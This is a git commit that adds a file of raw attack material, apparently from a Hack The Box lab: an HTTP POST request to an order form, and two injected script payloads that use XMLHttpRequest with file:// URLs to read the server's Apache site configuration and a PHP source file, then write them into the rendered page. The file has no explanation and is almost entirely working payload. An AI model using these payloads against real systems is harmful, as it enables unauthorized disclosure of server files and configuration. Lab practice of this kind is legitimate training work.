913946f96d9e4afc43b29031aa199d65aa278d3b
babywyrm <55672787+babywyrm@users.noreply.github.com>
2024-01-15 21:17:11 -0800

    Create fileget.js

---
+++ xml/htb/fileget.js
@@ -0,0 +1,43 @@
+POST /order.php HTTP/1.1
+Host: 83.136.250.104:35832
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 385
+Origin: http://83.136.250.104:35832
+Connection: close
+Referer: http://83.136.250.104:35832/
+Upgrade-Insecure-Requests: 1
+//
+//
+//
+
+id=2&title=RAM&desc=32GB of our custom RAM. Comes with much RGB.&comment=id=3&title=<script>
+	x = new XMLHttpRequest();
+	x.onload = function(){
+		document.write(this.responseText)
+	};
+	x.open("GET", "file:///etc/apache2/sites-available/000-default.conf");
+	x.send();
+</script>
+&desc=Our+custom+motherboard.&comment=asdfasdfasdf&desc=Our+custom+motherboard.&comment=asdfasdfasdf
+
+//
+//
+//
+
+  id=2&title=RAM&desc=32GB of our custom RAM. Comes with much RGB.&comment=id=3&title=<script>
+	x = new XMLHttpRequest();
+	x.onload = function(){
+		document.write(this.responseText)
+	};
+	x.open("GET", "file:///var/www/INSIDE/index.php");
+	x.send();
+</script>
+&desc=Our+custom+motherboard.&comment=asdfasdfasdf&desc=Our+custom+motherboard.&comment=asdfasdfasdf
+
+  //
+  //
+  //
